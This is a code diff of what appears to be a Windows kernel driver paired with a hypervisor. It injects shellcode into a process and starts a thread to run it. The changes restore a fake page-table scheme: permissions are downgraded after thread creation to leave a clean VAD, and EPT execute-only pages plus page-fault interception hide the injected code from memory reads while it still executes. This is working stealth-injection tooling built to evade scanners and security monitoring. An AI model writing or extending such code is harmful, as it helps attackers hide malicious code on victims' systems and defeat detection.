@@ -24,6 +24,9 @@
 // ---- undocumented PEB structures for user-mode module walk ----
 
 extern "C" NTKERNELAPI PPEB PsGetProcessPeb(PEPROCESS Process);
+extern "C" NTSYSAPI NTSTATUS NTAPI ZwProtectVirtualMemory(
+    HANDLE ProcessHandle, PVOID * BaseAddress, PSIZE_T RegionSize,
+    ULONG NewProtect, PULONG OldProtect);
 
 typedef struct _TD_UNICODE_STRING {
     USHORT Length;
@@ -73,6 +76,7 @@ typedef struct _TD_HOOK_INJECT_PARAM {
     UINT64  pt_page_pfn;            // PFN of guest PT page containing target PTE
     UINT32  pt_pte_index;           // index within PT page (0-511)
     PVOID   pt_page_copy;           // kernel buffer with PT page content (4KB)
+    PVOID   pt_page_va;             // system VA of real PT page (hostcr3-mapped)
     volatile LONG installed;
     BOOLEAN result;
     BOOLEAN fake_pt_ok;
@@ -101,6 +105,7 @@ typedef struct _TD_STEALTH_PARAM {
     UINT64  pt_page_pfn;        // PFN of guest PT page containing target PTE
     UINT32  pt_pte_index;       // index within PT page (0-511)
     PVOID   pt_page_copy;       // NonPaged buffer with PT page content (4KB)
+    PVOID   pt_page_va;         // system VA of real PT page (for MTF resync)
     PVOID   target_page_copy;   // NonPaged buffer with target page content (4KB)
     BOOLEAN pt_precomputed;     // TRUE = caller filled above fields at PASSIVE_LEVEL
     volatile LONG installed;
@@ -465,6 +470,8 @@ TdStealthAllocPage(
             RtlCopyMemory(tgt_buf, tgt_va, PAGE_SIZE);
         else
             RtlZeroMemory(tgt_buf, PAGE_SIZE);
+
+        req.pt_page_va = pt_va;  // system VA for VMX-root MTF resync (NULL if unavailable)
     }
 
     req.pt_page_copy     = pt_buf;
@@ -1222,10 +1229,10 @@ static NTSTATUS TdIoControl(PDEVICE_OBJECT, PIRP irp)
         size = (size + PAGE_SIZE - 1) & ~(PAGE_SIZE - 1);
 
         //
-        // PAGE_EXECUTE_READWRITE — NX=0 in guest PTE.
-        // EPT hides page content: execute-only (R=0, X=1) → reads see zeros.
-        // VAD shows executable — fake PT NX hiding is disabled (unstable,
-        // causes MEMORY_MANAGEMENT BSOD from page table corruption).
+        // PAGE_EXECUTE_READWRITE at alloc time — thread creation checks VAD
+        // and rejects non-executable start address. after thread is created,
+        // ZwProtectVirtualMemory downgrades to PAGE_READWRITE (NX=1, clean VAD).
+        // fake PT (NX=1) + exec PT (NX=0) + #PF interception handle execution.
         //
         st = ZwAllocateVirtualMemory(
             ZwCurrentProcess(), &base, 0, &size,
@@ -1333,8 +1340,19 @@ static NTSTATUS TdIoControl(PDEVICE_OBJECT, PIRP irp)
         UINT32 pt_idx = 0;
         PVOID  pt_page_buf = NULL;
 
+        PVOID pt_real_va = NULL;  // system VA of real PT page (for VMX-root resync)
+
         if (TdResolveGuestPT(caller_cr3, (UINT64)base & ~0xFFFULL, &pt_pfn, &pt_idx))
         {
+            //
+            // get system VA of real PT page for VMX-root MTF resync.
+            // VMX-root switches to system CR3 to read through this VA,
+            // keeping fake PT in sync with Windows' PTE modifications.
+            //
+            PHYSICAL_ADDRESS ptpa;
+            ptpa.QuadPart = (LONGLONG)(pt_pfn << 12);
+            pt_real_va = MmGetVirtualForPhysical(ptpa);
+
             //
             // copy PT page content to kernel NonPaged buffer for VMX-root.
             // do NOT touch the real PTE — Windows owns it.
@@ -1342,11 +1360,8 @@ static NTSTATUS TdIoControl(PDEVICE_OBJECT, PIRP irp)
             pt_page_buf = ExAllocatePool2(POOL_FLAG_NON_PAGED, PAGE_SIZE, 'kjnI');
             if (pt_page_buf)
             {
-                PHYSICAL_ADDRESS ptpa;
-                ptpa.QuadPart = (LONGLONG)(pt_pfn << 12);
-                PVOID pt_va = MmGetVirtualForPhysical(ptpa);
-                if (pt_va)
-                    RtlCopyMemory(pt_page_buf, pt_va, PAGE_SIZE);
+                if (pt_real_va)
+                    RtlCopyMemory(pt_page_buf, pt_real_va, PAGE_SIZE);
                 else
                     RtlZeroMemory(pt_page_buf, PAGE_SIZE);
 
@@ -1358,7 +1373,7 @@ static NTSTATUS TdIoControl(PDEVICE_OBJECT, PIRP irp)
                 ((PUINT64)pt_page_buf)[pt_idx] &= ~(1ULL << 63);
             }
 
-            DbgPrintEx(0, 0, "[td] inject: PT PFN=%llx idx=%u\n", pt_pfn, pt_idx);
+            DbgPrintEx(0, 0, "[td] inject: PT PFN=%llx idx=%u va=%p\n", pt_pfn, pt_idx, pt_real_va);
         }
         else
         {
@@ -1373,11 +1388,10 @@ static NTSTATUS TdIoControl(PDEVICE_OBJECT, PIRP irp)
         inj_req.fake_page_buffer = fake_buf;
         inj_req.hook_size        = hook_size;
         inj_req.force_read_access = FALSE;  // execute-only: reads → original page (zeros)
-        // fake PT disabled — causes MEMORY_MANAGEMENT BSOD from PT corruption.
-        // NX hiding requires a more robust guest PT virtualization approach.
-        inj_req.pt_page_pfn      = 0;
-        inj_req.pt_pte_index     = 0;
-        inj_req.pt_page_copy     = NULL;
+        inj_req.pt_page_pfn      = pt_pfn;
+        inj_req.pt_pte_index     = pt_idx;
+        inj_req.pt_page_copy     = pt_page_buf;
+        inj_req.pt_page_va       = pt_real_va;
 
         KeGenericCallDpc([](PKDPC, PVOID Ctx, PVOID A1, PVOID A2) {
             hv_vmcall_simple(VMCALL_EPT_HOOK_INJECT, (UINT64)Ctx, 0, 0);
@@ -1427,7 +1441,6 @@ static NTSTATUS TdIoControl(PDEVICE_OBJECT, PIRP irp)
         // --- step 7: create thread ---
         if (NT_SUCCESS(st) && p->shellcode_va)
         {
-            // debug: re-check NX before thread creation
             NTSTATUS thr_st = TdCreateThread(proc, (PVOID)p->shellcode_va);
             p->actual_size |= ((UINT64)(UINT32)thr_st << 32);
             DbgPrintEx(0, 0, "[td] inject: thread=0x%08X\n", thr_st);
